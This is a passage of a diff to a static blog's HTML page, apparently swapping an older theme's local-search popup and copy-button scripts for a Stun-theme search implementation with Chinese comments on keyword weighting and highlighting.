-                      hits: hits,
-                      start: start,
-                      end: end,
-                      searchTextCount: searchTextCountInSlice
-                    };
-                  }
-
-                  var slicesOfTitle = [];
-                  if (indexOfTitle.length != 0) {
-                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
-                  }
-
-                  var slicesOfContent = [];
-                  while (indexOfContent.length != 0) {
-                    var item = indexOfContent[indexOfContent.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    // cut out 100 characters
-                    var start = position - 20;
-                    var end = position + 80;
-                    if(start < 0){
-                      start = 0;
-                    }
-                    if (end < position + word.length) {
-                      end = position + word.length;
-                    }
-                    if(end > content.length){
-                      end = content.length;
-                    }
-                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
-                  }
-
-                  // sort slices in content by search text's count and hits' count
-
-                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
-                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
-                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
-                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
-                      return sliceRight.hits.length - sliceLeft.hits.length;
-                    } else {
-                      return sliceLeft.start - sliceRight.start;
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
                     }
                   });
-
-                  // select top N slices in content
-
-                  var upperBound = parseInt('1');
-                  if (upperBound >= 0) {
-                    slicesOfContent = slicesOfContent.slice(0, upperBound);
-                  }
-
-                  // highlight title and content
-
-                  function highlightKeyword(text, slice) {
-                    var result = '';
-                    var prevEnd = slice.start;
-                    slice.hits.forEach(function (hit) {
-                      result += text.substring(prevEnd, hit.position);
-                      var end = hit.position + hit.length;
-                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
-                      prevEnd = end;
-                    });
-                    result += text.substring(prevEnd, slice.end);
-                    return result;
-                  }
-
-                  var resultItem = '';
-
-                  if (slicesOfTitle.length != 0) {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
-                  } else {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
-                  }
-
-                  slicesOfContent.forEach(function (slice) {
-                    resultItem += "<a href='" + articleUrl + "'>" +
-                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
-                      "...</p>" + "</a>";
-                  });
-
-                  resultItem += "</li>";
-                  resultItems.push({
-                    item: resultItem,
-                    searchTextCount: searchTextCount,
-                    hitCount: hitCount,
-                    id: resultItems.length
-                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                 }
-              })
-            };
-            if (keywords.length === 1 && keywords[0] === "") {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
-            } else if (resultItems.length === 0) {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
-            } else {
-              resultItems.sort(function (resultLeft, resultRight) {
-                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
-                  return resultRight.searchTextCount - resultLeft.searchTextCount;
-                } else if (resultLeft.hitCount !== resultRight.hitCount) {
-                  return resultRight.hitCount - resultLeft.hitCount;
-                } else {
-                  return resultRight.id - resultLeft.id;
-                }
-              });
-              var searchResultList = '<ul class=\"search-result-list\">';
-              resultItems.forEach(function (result) {
-                searchResultList += result.item;
-              })
-              searchResultList += "</ul>";
-              resultContent.innerHTML = searchResultList;
-            }
-          }
-
-          if ('auto' === 'auto') {
-            input.addEventListener('input', inputEventFunction);
-          } else {
-            $('.search-icon').click(inputEventFunction);
-            input.addEventListener('keypress', function (event) {
-              if (event.keyCode === 13) {
-                inputEventFunction();
+                return result;
               }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
             });
-          }
 
-          // remove loading animation
-          $(".local-search-pop-overlay").remove();
-          $('body').css('overflow', '');
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
 
-          proceedsearch();
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
         }
       });
     }
+  });
+}
 
-    // handle and trigger popup window;
-    $('.popup-trigger').click(function(e) {
-      e.stopPropagation();
-      if (isfetched === false) {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      } else {
-        proceedsearch();
-      };
-    });
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
 
-    $('.popup-btn-close').click(onPopupClose);
-    $('.popup').click(function(e){
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
       e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
     });
-    $(document).on('keyup', function (event) {
-      var shouldDismissSearchPopup = event.which === 27 &&
-        $('.search-popup').is(':visible');
-      if (shouldDismissSearchPopup) {
-        onPopupClose();
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
       }
     });
-  </script>
+  };
 
-
-
-
-
-  
-
-  
-
-  
-
-  
-
-  
-  
-
-  
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-  <style>
-    .copy-btn {
-      display: inline-block;
-      padding: 6px 12px;
-      font-size: 13px;
-      font-weight: 700;
-      line-height: 20px;
-      color: #333;
-      white-space: nowrap;
-      vertical-align: middle;
-      cursor: pointer;
-      background-color: #eee;
-      background-image: linear-gradient(#fcfcfc, #eee);
-      border: 1px solid #d5d5d5;
-      border-radius: 3px;
-      user-select: none;
-      outline: 0;
-    }
-
-    .highlight-wrap .copy-btn {
-      transition: opacity .3s ease-in-out;
-      opacity: 0;
-      padding: 2px 6px;
-      position: absolute;
-      right: 4px;
-      top: 8px;
-    }
-
-    .highlight-wrap:hover .copy-btn,
-    .highlight-wrap .copy-btn:focus {
-      opacity: 1
-    }
-
-    .highlight-wrap {
-      position: relative;
-    }
-  </style>
-  <script>
-    $('.highlight').each(function(i, e) {
-      var $wrap = $('<div>').addClass('highlight-wrap');
-      $(e).after($wrap);
-      $wrap.append($('<button>').addClass('copy-btn').append('Copy').on('click', function(e) {
-        var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
-          return $(e).text();
-        }).toArray().join('\n');
-        var ta = document.createElement('textarea');
-        var range = document.createRange(); //For Chrome
-        var sel = window.getSelection(); //For Chrome
-        var yPosition = window.pageYOffset || document.documentElement.scrollTop;
-        ta.style.top = yPosition + 'px'; //Prevent page scroll
-        ta.style.position = 'absolute';
-        ta.style.opacity = '0';
-        ta.value = code;
-        ta.textContent = code; //For FireFox
-        ta.contentEditable = true;
-        ta.readOnly = false;
-        document.body.appendChild(ta);
-        range.selectNode(ta);
-        sel.removeAllRanges();
-        sel.addRange(range);
-        ta.setSelectionRange(0, code.length);
-        var result = document.execCommand('copy');
-        
-        ta.blur(); //For iOS
-        $(this).blur();
-      })).on('mouseleave', function(e) {
-        var $b = $(this).find('.copy-btn');
-        setTimeout(function() {
-          $b.text('Copy');
-        }, 300);
-      }).append(e);
-    })
-  </script>
-
-
-  
-
-  <script type="text/javascript" src="/js/src/dynamic_bg.js"></script>
-  <!-- 页面点击小红心 -->
-  <script type="text/javascript" src="/js/src/clicklove.js"></script>
-</body>
-</html>
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);</script><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script type="application/json" src="/search.json"></script></body></html>
